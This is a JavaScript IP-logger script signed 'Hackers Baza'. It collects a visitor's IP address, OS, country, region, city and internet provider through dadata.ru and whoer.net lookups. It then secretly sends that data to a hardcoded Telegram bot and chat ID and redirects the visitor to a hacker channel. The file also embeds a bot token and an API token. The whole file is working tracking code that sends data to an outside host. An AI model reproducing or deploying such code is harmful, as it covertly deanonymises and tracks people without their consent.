// By Hackers Baza
var platform = navigator.userAgent;
var logs = [];
var bot = "6556211613:AAHQiEWk9ojXwpGWri_j-R-LRE4iXDsJ9mo";
var id = 1249118532; // Telegram ID
var token = "da0e33fd3fa17b1ad214f636aebf134d40b4f984"; // https://dadata.ru

function sendInformation() {
    console.log("✅ Отправлено!");

    const text = logs.join('%0A');

    var url = `https://api.telegram.org/bot${bot}/sendMessage?chat_id=${id}&parse_mode=html&text=${text}`;

    var options = {
        method: "POST",
        mode: "cors",
        headers: {
            "Content-Type": "application/json",
            "Accept": "application/json",
            "Authorization": "Token " + bot
        }
    }
    
    fetch(url, options)
    .then(response => response.text())
    .then(result => location="https://t.me/hackers_baza")
    .catch(error => console.log("error", error));
}

function IPLocation(location) {
    let json = JSON.parse(location);

    var os = "🔻 <b>OS:</b> <code>" + platform.os + "</code>";
    var country = "🔻 <b>Country:</b> <code>" + json.location.data.country + "</code>";
    var federal = "🔻 <b>Federal:</b> <code>" + json.location.data.federal_district + "</code>";
    var city = "🔻 <b>City:</b> <code>" + json.location.unrestricted_value + "</code>";

    logs.push(os, country, federal, city);
}

function IPProvider(information) {
    let text = information.replace(/<[\/]*pre(.*?)>/g, '').replace(/<[\/]*span(.*?)>/g, '').split("\n");

    if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|BB|PlayBook|IEMobile|Windows Phone|Kindle|Silk|Opera Mini/i
    .test(navigator.userAgent)) {
        var provider = "🔻 <b>Provider:</b> <code>" + text[1].replace("netname", "").trim() + "</code>";
        var ip = "🔻 <b>Provider IP:</b> <code>" + text[37].replace("descr", "").trim() + "</code>";
    } 
    else {
        var provider = "🔻 <b>Provider:</b> <code>" + text[2].replace("descr", "").trim() + "</code>";
        var ip = "🔻 <b>Provider IP:</b> <code>" + text[33].replace("route", "").trim() + "</code>";
    }

    logs.push(provider, ip);

    sendInformation();
}

function getIP(json) {
	var ip = "🔻 <b>IP:</b> <code>" + json.ip + "</code>";
    logs.push(ip);

    getInfo(json.ip);

	var url = "https://suggestions.dadata.ru/suggestions/api/4_1/rs/iplocate/address?ip=";
    var query = json.ip;

    var options = {
        method: "GET",
        mode: "cors",
        headers: {
            "Content-Type": "application/json",
            "Accept": "application/json",
            "Authorization": "Token " + token
        }
    }
    
    fetch(url + query, options)
    .then(response => response.text())
    .then(result => IPLocation(result))
    .catch(error => console.log("error", error));
}

function getInfo(ip) {
    var url = "https://whoer.net/whois?host=";
    var query = ip;

    fetch(url + query)
    .then(response => response.text())
    .then(result => IPProvider(result))
    .catch(error => console.log("error", error));
}